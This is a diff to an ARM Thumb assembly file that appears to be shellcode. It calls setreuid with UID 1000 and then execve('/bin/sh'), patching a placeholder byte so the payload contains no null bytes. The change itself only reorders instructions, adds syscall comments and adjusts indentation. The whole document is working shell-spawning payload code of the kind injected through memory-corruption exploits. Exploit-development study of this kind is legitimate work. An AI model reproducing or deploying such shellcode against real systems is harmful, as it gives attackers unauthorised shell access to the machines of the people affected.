@@ -11,20 +11,22 @@ _start:
     .code 16
 
     // setreuid(1000, 0000)
-    mov r7, #0x46
     ldr r0, uid
     mov r1, r0
+
+    mov r7, #0x46 // SYS_setreuid
     swi #1
 
     // execve("/bin/sh", NULL, NULL)
     adr r0, binsh
-    eor r1, r1, r1
-    eor r2, r2, r2
+    eor r1, r1
+    eor r2, r2
     strb r2, [r0, #7]
-    mov r7, #11
+    
+    mov r7, #11 // SYS_execve
     swi #1
 
     binsh:
-    .ascii "/bin/shx"
+        .ascii "/bin/shx"
     uid:
-    .byte 0xe8, 0x03 // 1000
+        .byte 0xe8, 0x03 // UID: 1000
